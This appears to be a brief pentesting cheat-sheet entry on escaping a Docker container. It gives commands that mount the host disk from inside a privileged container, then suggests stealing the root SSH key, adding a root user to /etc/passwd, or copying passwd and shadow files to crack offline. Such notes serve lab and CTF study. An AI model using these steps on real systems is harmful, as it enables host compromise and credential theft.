# Docker 
----------


## Container Escape
- Check for sd disks in /dev using linpeas or deepce or the command mount
- Mount the file system sda1 (as root)
```bash
mkdir /mnt/sda2
mount /dev/sda2 /mnt/sda2
ls /mnt/sda2 #copies over the entire file system
```

Get the id_rsa of the root and ssh into the machine.
Or add a new user with root privileges to /etc/passwd 
Or copy over etc/passwd and shadow to crack it locally

